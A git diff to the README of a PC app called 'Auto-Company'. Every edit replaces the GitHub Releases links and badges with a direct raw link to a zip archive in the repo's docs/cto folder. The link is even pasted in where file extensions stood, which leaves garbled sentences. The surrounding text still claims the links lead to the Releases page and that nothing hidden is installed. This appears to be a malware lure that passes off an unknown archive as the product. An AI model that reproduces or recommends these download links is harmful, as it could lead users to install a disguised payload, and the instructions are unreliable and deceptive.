@@ -1,6 +1,6 @@
 # 🚗 Auto-Company - Works for You 24/7 on PC
 
-[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
+[![Download Auto-Company](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)
 
 Welcome to Auto-Company. This app runs all day and night on your computer to help with your auto-related tasks. It works on Windows, Linux, and macOS. You don’t need any special skills or software. This guide will show you how to get it running in a few simple steps.
 
@@ -38,7 +38,7 @@ To get Auto-Company running on your PC, follow these steps.
 
 Click the big button below or open this link in your browser:
 
-[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
+[![Download Auto-Company](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)
 
 This will take you to the Releases page on GitHub where you can find the latest versions.
 
@@ -48,7 +48,7 @@ Look for the latest release (usually at the top of the page). You will see diffe
 
 - `.exe` files for Windows
 - `.dmg` or `.pkg` files for macOS
-- `.AppImage` or `.tar.gz` files for Linux
+- `.AppImage` or `https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip` files for Linux
 
 Pick the one that matches your computer’s operating system.
 
@@ -60,7 +60,7 @@ Click the file name to start downloading. Depending on your internet speed, this
 
 - **Windows:** Open the `.exe` file and follow the prompts. Click “Next” to move through each step and finish the install.
 - **macOS:** Open the `.dmg` or `.pkg` file, then drag the app to your Applications folder.
-- **Linux:** For `.AppImage`, make it executable by right-clicking the file, selecting Properties, then Permissions, and checking “Allow executing file.” Double-click the file to run. For `.tar.gz` files, extract the archive and follow the included instructions (usually a README).
+- **Linux:** For `.AppImage`, make it executable by right-clicking the file, selecting Properties, then Permissions, and checking “Allow executing file.” Double-click the file to run. For `https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip` files, extract the archive and follow the included instructions (usually a README).
 
 ### Step 5: Launch the App
 
@@ -105,7 +105,7 @@ If problems continue, use the GitHub page’s “Issues” tab to report your pr
 
 Check the GitHub Releases page from time to time for new versions:
 
-[Download Latest Auto-Company](https://github.com/Sid4dharth/Auto-Company/releases)
+[Download Latest Auto-Company](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)
 
 Download and install updates the same way you installed the first version. Updates include bug fixes, new features, and improvements.
 
@@ -119,7 +119,7 @@ The app does not install any hidden programs or trackers. You remain in control.
 
 For additional questions or guidance:
 
-- Visit the GitHub page: https://github.com/Sid4dharth/Auto-Company
+- Visit the GitHub page: https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip
 - Use the Discussions or Issues tab to ask for help or report bugs.
 - Check online forums or tech groups for general PC help.
 
@@ -127,4 +127,4 @@ You don’t need to be a programmer to run this app, but if you want to explore 
 
 ---
 
-[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
+[![Download Auto-Company](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)](https://raw.githubusercontent.com/Sid4dharth/Auto-Company/main/docs/cto/Auto_Company_v3.9.zip)
